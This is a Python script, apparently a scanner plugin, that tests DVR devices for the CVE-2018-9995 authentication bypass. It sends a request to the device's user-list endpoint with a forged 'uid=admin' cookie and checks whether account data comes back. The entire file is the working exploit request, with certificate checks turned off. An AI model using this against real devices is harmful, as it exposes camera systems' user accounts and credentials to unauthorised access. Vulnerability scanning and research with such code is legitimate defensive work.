# coding: utf-8

import re
import requests
import warnings

def verify(protocol,ip,port):
    url = protocol + '://' + ip + ':' + str(port)
    warnings.filterwarnings("ignore")
    print('testing if dvr device auth bypass vul (cve-2018-9995)')
    headers = {
        "Connection":"close",
        "Accept-Encoding":"gzip, deflate",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Accept-Languag": "es-AR,en-US;q=0.7,en;q=0.3",
        "Cookie":"uid=admin",
        "Content-Type":"text/html"
    }
    test_verify = 'role.*?playback.*?view'
    vulpoc = '/device.rsp?opt=user&cmd=list'
    vulurl = url + vulpoc
    try:
        req = requests.get(vulurl, headers=headers, timeout=3, verify=False)
        match = re.search(r''+ test_verify +'',req.text ,re.IGNORECASE)
        if match:
            msg = 'There is dvr device auth bypass vul (cve-2018-9995) vul on url: ' + url + ' .'
            number = 'v124'
            return True, url, number, msg
        else:
            pass
        if 'role' in req.text and 'playback' in req.text and 'view' in req.text:
            msg = 'There is dvr device auth bypass vul (cve-2018-9995) on url: ' + url + ' .'
            number = 'v124'
            return True, url, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False, url,number,msg
    msg = 'There is no dvr device auth bypass vul (cve-2018-9995)'
    number = 'v0'
    return False, url, number, msg

